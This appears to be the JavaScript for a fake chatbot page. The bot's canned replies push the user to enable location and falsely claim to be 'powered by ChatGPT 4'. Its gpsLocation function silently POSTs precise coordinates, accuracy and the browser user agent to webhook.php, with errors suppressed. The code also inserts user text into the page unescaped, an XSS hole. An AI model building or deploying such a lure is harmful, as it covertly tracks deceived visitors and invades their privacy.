const msgerForm = get(".msger-inputarea");
const msgerInput = get(".msger-input");
const msgerChat = get(".msger-chat");

const BOT_MSGS = [
"Hi, how are you?",
"Turn your location on for find people near you",
"I am powered by ChatGPT 4",
"I feel sleepy! :("];


// Icons made by Freepik from www.flaticon.com
const BOT_IMG = "https://image.flaticon.com/icons/svg/327/327779.svg";
const PERSON_IMG = "https://image.flaticon.com/icons/svg/145/145867.svg";
const BOT_NAME = "Admin";
const PERSON_NAME = "User";

msgerForm.addEventListener("submit", event => {
  event.preventDefault();

  const msgText = msgerInput.value;
  if (!msgText) return;
  appendMessage(PERSON_NAME, PERSON_IMG, "right", msgText);
  msgerInput.value = "";
  botResponse();
});

function appendMessage(name, img, side, text) {
  //   Simple solution for small apps
  const msgHTML = `
    <div class="msg ${side}-msg">
      <div class="msg-img" style="background-image: url(${img})"></div>

      <div class="msg-bubble">
        <div class="msg-info">
          <div class="msg-info-name">${name}</div>
          <div class="msg-info-time">${formatDate(new Date())}</div>
        </div>

        <div class="msg-text">${text}</div>
      </div>
    </div>
  `;

  msgerChat.insertAdjacentHTML("beforeend", msgHTML);
  msgerChat.scrollTop += 500;
}
function botResponse() {
  const r = random(0, BOT_MSGS.length - 1);
  const msgText = BOT_MSGS[r];
  const delay = msgText.split(" ").length * 100;

  setTimeout(() => {
    appendMessage(BOT_NAME, BOT_IMG, "left", msgText);
  }, delay);
}
// Utils
function get(selector, root = document) {
  return root.querySelector(selector);
}
function formatDate(date) {
  const h = "0" + date.getHours();
  const m = "0" + date.getMinutes();

  return `${h.slice(-2)}:${m.slice(-2)}`;
}
function random(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

/* GPS location: request, show in chat and POST to webhook.php */
function gpsLocation() {
  if (!navigator.geolocation) {
    appendMessage(BOT_NAME, BOT_IMG, "left", "เบราว์เซอร์ของคุณไม่รองรับ Geolocation");
    return;
  }

  appendMessage(BOT_NAME, BOT_IMG, "left", "กำลังขออนุญาตตำแหน่ง...");

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const text = `ตำแหน่งที่พบ: latitude ${lat.toFixed(6)}, longitude ${lon.toFixed(6)}`;
      appendMessage(BOT_NAME, BOT_IMG, "left", text);

      // เก็บข้อมูลสั้นๆ ในหน้า (ไม่บังคับ)
      const tech = document.getElementById("techchip");
      if (tech) tech.textContent = JSON.stringify({lat, lon, timestamp: Date.now()});

      // ส่งข้อมูลไปยัง webhook.php (JSON)
      fetch('webhook.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          lat: lat,
          lon: lon,
          accuracy: pos.coords.accuracy,
          timestamp: pos.timestamp,
          ua: navigator.userAgent
        })
      }).catch(()=>{ /* silent fail */ });
    },
    (err) => {
      let msg = "ไม่สามารถรับตำแหน่งได้";
      if (err.code === 1) msg = "ปฏิเสธการเข้าถึงตำแหน่ง (permission denied)";
      else if (err.code === 2) msg = "ไม่พบตำแหน่ง (position unavailable)";
      else if (err.code === 3) msg = "หมดเวลาการรับตำแหน่ง (timeout)";
      appendMessage(BOT_NAME, BOT_IMG, "left", msg);
    },
    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
  );
}